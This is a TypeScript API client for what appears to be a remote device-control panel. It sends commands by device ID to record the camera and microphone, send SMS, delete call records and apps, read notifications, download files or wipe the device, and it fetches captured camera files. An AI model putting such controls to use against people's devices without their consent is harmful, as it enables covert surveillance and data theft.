import {AxiosResponse} from 'axios'
import axiosInstance from '../utils/axiosInstance'
import {CONFIG} from './config'
import {ApiResponseWithCount, SortingColumn} from '../shared/types/sharedTypes'

// Продолжить расширять по мере добавления новых команд. Берётся отсюда: https://confluence.hexteam.tech/pages/viewpage.action?pageId=83068147
export enum CommandTypes {
    RECORD_CAMERA = 7,
    RECORD_MICROPHONE = 9,
    ADD_CONTACT = 1,
    DELETE_CONTACT = 2,
    SEND_SMS = 3,
    DEL_CALL = 22,
    DEL_APPLICATION = 17,
    MAKE_A_CALL = 4,
    BROWSE_URL = 13,
    VIEW_NOTIFICATIONS = 23,
    DESTROY = 24,
    DOWNLOAD_FILES = 26,
}

export interface CommandBody {
    command_type: CommandTypes
    content: any
}

export interface CreateCommandProps {
    device_id: string
    body: CommandBody
}

export interface CreateCommandResponse {
    command_type: number
    content: any
    log_time: string
    id: number
    status: number
}

export interface GetCameraFilesProps {
    device_id: string
    camera_id?: number
    limit: number
    page: number
    sort_by?: SortingColumn | null
}

export interface GetCameraFilesResponse {
    id: number
    source_path: string
    camera_id: number
    log_time: string
}

export interface GetCommandsProps {
    device_id: string
    limit: number
    page: number
    sort_by?: SortingColumn | null
}

export interface GetCommandsResponse {
    command_type: number
    content: any
    log_time: string
    id: number
    status: number
}

export interface DeleteCommandProps {
    device_id: string
    ids: number
}

export default class CommandService {
    static async createCommand(config: CreateCommandProps): Promise<AxiosResponse<CreateCommandResponse[]>> {
        const {device_id, body} = config
        return await axiosInstance.post(`${CONFIG.front_url}command/${device_id}`, body)
    }

    static async getCameraFiles(config: GetCameraFilesProps): Promise<ApiResponseWithCount<GetCameraFilesResponse[]>> {
        const {device_id, sort_by, page, limit} = config

        const params: {device_id: string; sort_by?: string; page: number; limit: number} = {
            device_id,
            limit,
            page,
        }
        if (sort_by) {
            sort_by.order === 'asc' ? (params.sort_by = `+${sort_by.name}`) : (params.sort_by = `-${sort_by.name}`)
        }

        const apiResponse = await axiosInstance.get(`${CONFIG.front_url}files/camera/`, {params})

        // @ts-ignore
        return {apiResponse: apiResponse.data, count: apiResponse.headers.get('x-total-count') || 0}
    }

    static async downloadCameraFile(Id: number): Promise<AxiosResponse<Blob>> {
        return await axiosInstance.get(`${CONFIG.front_url}files/camera/${Id}`, {responseType: 'blob'})
    }

    static async deleteCameraFile(ids: number): Promise<AxiosResponse<number[]>> {
        return await axiosInstance.delete(`${CONFIG.front_url}files/camera/`, {params: {ids}})
    }

    static async getCommands(config: GetCommandsProps): Promise<ApiResponseWithCount<GetCommandsResponse[]>> {
        const {device_id, sort_by, page, limit} = config

        const params: {device_id: string; sort_by?: string; page: number; limit: number} = {
            device_id,
            limit,
            page,
        }
        if (sort_by) {
            sort_by.order === 'asc' ? (params.sort_by = `+${sort_by.name}`) : (params.sort_by = `-${sort_by.name}`)
        }

        const apiResponse = await axiosInstance.get(`${CONFIG.front_url}command/${device_id}`, {params})

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        return {apiResponse: apiResponse.data, count: apiResponse.headers.get('x-total-count') || 0}
    }

    static async deleteCommand(config: DeleteCommandProps): Promise<AxiosResponse<number[]>> {
        const {device_id, ids} = config
        return await axiosInstance.delete(`${CONFIG.front_url}command/${device_id}/`, {params: {ids}})
    }
}
